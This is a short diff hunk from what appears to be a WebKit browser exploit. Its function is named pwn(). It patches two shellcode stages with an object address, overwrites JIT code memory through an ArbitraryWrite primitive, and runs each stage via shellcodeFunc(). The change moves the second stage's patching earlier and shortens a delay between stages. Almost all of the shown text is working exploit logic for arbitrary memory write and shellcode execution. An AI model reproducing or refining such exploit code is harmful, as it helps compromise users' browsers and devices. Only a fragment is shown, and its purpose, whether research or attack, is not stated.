@@ -409,10 +409,10 @@ function pwn() {
     writeStringToUint8Array("/Library/Caches/com.apple.WebKit.WebContent/log.txt", ourArray, stringsOff + 105);
     
     stage1.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
+    stage2.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
     ArbitraryWrite(JITCode, stage1);
     shellcodeFunc();
-    millis(1000 * 5);
-    stage2.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
+    millis(1000 * 2);
     ArbitraryWrite(JITCode, stage2);
     shellcodeFunc();
     
